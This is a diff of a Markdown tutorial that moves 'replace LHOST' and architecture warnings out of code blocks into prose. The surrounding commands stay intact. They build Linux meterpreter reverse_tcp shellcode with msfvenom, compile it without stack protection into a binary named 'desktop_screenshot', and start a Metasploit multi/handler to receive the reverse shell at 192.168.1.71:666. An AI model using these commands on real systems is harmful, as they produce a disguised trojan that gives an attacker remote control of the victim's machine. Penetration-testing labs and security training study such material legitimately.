@@ -63,11 +63,10 @@ sudo service postgresql start
 <br />
 
 #### :: Use Metasploit to Build Shellcode in C Format
+**WARNING:** Replace LHOST value by your local ip address<br />
+**WARNING:** If your attacking a x64 bit system, then change the arch from -a x86 to -a x64<br />
 
 ```
-## Build raw shellcode in C
-# WARNING: Replace LHOST value by your local ip address
-# WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to -a x64
 sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 -b '\x00' -a x86 --platform linux -f c -o chars.raw
 
 ```
@@ -136,10 +135,10 @@ sudo gcc -fno-stack-protector -z execstack payload.c -o desktop_screenshot
 <br />
 
 #### :: Start metasploit multi handler
+**WARNING:** Replace LHOST value by your local ip address<br />
+**WARNING:** If your attacking a x64 bit system, then change the arch from -a x86 to -a x64<br />
 
 ```
-# WARNING: Replace LHOST value by your local ip address
-# WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to -a x64
 sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'
 ```
 
